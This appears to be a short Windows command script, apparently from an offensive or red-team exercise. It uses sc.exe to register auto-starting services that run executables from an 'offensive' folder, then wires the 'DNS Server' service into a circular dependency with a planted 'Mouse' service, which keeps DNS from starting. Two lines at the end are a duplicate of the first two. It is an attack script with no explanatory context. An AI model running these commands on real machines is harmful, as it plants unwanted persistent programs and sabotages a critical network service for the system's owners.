sc.exe create "RELEASE KINGDOM HEARTS IV" binPath = "C:\offensive\compiled_exes\hi.exe" start=auto
sc.exe config "RELEASE KINGDOM HEARTS IV" depend=DNS Server

sc.exe create "Mouse" binPath = "C:\offensive\compiled_exes\mousejail.exe" start=auto
sc.exe config "Mouse" depend=DNS Server
sc.exe config "DNS Server" depend=Mouse


sc.exe create "RELEASE KINGDOM HEARTS IV" binPath = "C:\offensive\compiled_exes\hi.exe" start=auto
sc.exe config "RELEASE KINGDOM HEARTS IV" depend=DNS Server